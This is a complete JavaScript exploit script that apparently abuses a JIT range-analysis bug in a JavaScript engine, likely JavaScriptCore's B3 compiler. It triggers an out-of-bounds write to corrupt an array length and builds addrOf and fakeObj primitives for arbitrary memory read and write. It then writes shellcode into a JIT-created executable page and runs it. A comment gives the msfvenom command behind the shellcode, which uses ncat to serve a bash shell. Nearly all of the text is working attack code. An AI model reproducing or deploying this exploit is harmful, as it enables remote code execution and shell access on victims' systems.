// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
var BASE = 0x100000000;

function ftoi(val) {
  f64_buf[0] = val;
  return u32_buf[0] + BASE * u32_buf[1]; // Watch for little endianness
}

function itof(val) {
  u32_buf[0] = val % BASE;
  u32_buf[1] = val / BASE;
  return f64_buf[0];
}

function hex(val) {
  return "0x" + val.toString(16);
}

function bug(arr, i) {
  // force num be int32 with "| 0" and trigger mis predict with "& 2"
  // B3 will assume RangeInt(1, 2), but actually RangeInt(0, 2)
  let badInt = (i | 0) & 2;
  badInt += -1;// RangeInt(0, 1) | RangeInt(-1, 1)
  let idx = badInt;
  if (idx < arr.length) {
    if (idx < 1) {
      // idx is a int32, subtracting "0x80000000" from 0 will result in "-2147483648", but
      // if subtract "0x80000000" from -1 will trigger a int overflow, resulting in "2147483647"
      idx += -0x80000000;
    }
    if (idx > 2) {
      idx += -0x7ffffff8; // idx == 7, oob by 1 index
    }

    if (idx > 0) {
      // length are in second dword
      arr[idx] = 0x111111_00001337; // overwrite next array length in heap
    }
  }
}

// jit to create rwx page
function jit_rwx(i) {
  return i + 10;
}

// Fill any existing holes in the heap.
// Not needed in js shell but it might be useful in Browser context
// let spray = [];
// for (let i = 0; i < 0x100000; i++) {
//     let arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
//     spray.push(arr);
// }

let noCoW = 13.37;
var arr = [noCoW, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7];
var float_arr = [noCoW, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7];
var obj_arr = [{}, {}, {}, {}, {}, {}, {}];

for (var i = 0; i < 1000000; i++) {
  bug(arr, 2);
}
print("Origin length: " + hex(float_arr.length))
bug(arr, 1);
print("Corrupt length: " + hex(float_arr.length))

let offset = 0x8
function addrOf(obj) {
  obj_arr[0] = obj;
  return ftoi(float_arr[offset]);
}

function fakeObj(addr) {
  float_arr[offset] = itof(addr);
  return obj_arr[0];
}

let o = { prop: 123 };
// primitives check
if (fakeObj(addrOf(o)).prop !== o.prop) {
  print("Error in fakeObj/addrOf");
}

var slave_arr = [noCoW, 1.2, 1.3, 1.4, 1.5];

u32_buf[1] = 0x1082407;
u32_buf[0] = Reflect.strid(slave_arr);

var fake_header = f64_buf[0];
var container = {
  cell: fake_header,
  butterfly: fakeObj(addrOf(slave_arr) + 8)
}

let fake_arr = fakeObj(addrOf(container) + 0x10);

function read(addr) {
  fake_arr[0] = itof(addr);
  return ftoi(slave_arr[0]);
}

function write(addr, value) {
  fake_arr[0] = itof(addr);
  slave_arr[0] = value;
}

for (let i = 0; i < 0x1000; i++) {
  jit_rwx(i);
}

let func_ptr = addrOf(jit_rwx);
let truc = read(func_ptr + 0x18);
let truc2 = read(truc + 0x8);
let rwx_page = read(truc2 + 0x10);
print("func_ptr: " + hex(func_ptr));
print("truc: " + hex(truc));
print("truc2: " + hex(truc2));
print("rwx_page: " + hex(rwx_page));

// msfvenom -p linux/x64/exec CMD='/bin/ncat -e /bin/bash 0.0.0.0 9001' --format raw
// use this to convert byte array in float shellcode https://vulndev.io/shellcode-converter/
var shellcode = [6.867659397734779e+246,
  7.806615353364766e+184,
  6.853094935120639e-131,
  3.2060568060029287e-80,
  1.2635190825353334e-152,
  6.077214651599889e+247,
  3.253502247693407e-86,
  1.856832711306088e+106,
  2.634860473837555e-284
];

for (let i = 0; i < shellcode.length; i++) {
  write(rwx_page + i * 8, shellcode[i]);
}

// execute shellcode
jit_rwx(0);